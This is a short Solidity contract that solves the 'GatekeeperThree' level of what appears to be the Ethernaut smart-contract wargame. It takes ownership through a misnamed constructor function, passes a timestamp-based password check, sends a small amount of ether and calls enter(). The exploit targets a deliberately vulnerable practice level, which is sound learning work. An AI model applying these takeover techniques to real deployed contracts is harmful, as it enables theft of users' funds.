// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../levels/GatekeeperThree.sol';

contract GatekeeperThreeAttack {
    GatekeeperThree public gatekeeperThree;

    constructor (address payable _gatekeeperThree) payable {
        gatekeeperThree = GatekeeperThree(_gatekeeperThree);
    }
    
    function attack() public {
        gatekeeperThree.construct0r();
        gatekeeperThree.createTrick();
        gatekeeperThree.getAllowance(block.timestamp);
        (bool sent, ) = payable(address(gatekeeperThree)).call{value: 1000000000000001 wei}("");
        require(sent, "Failed to send Ether");        
        gatekeeperThree.enter();
    }
}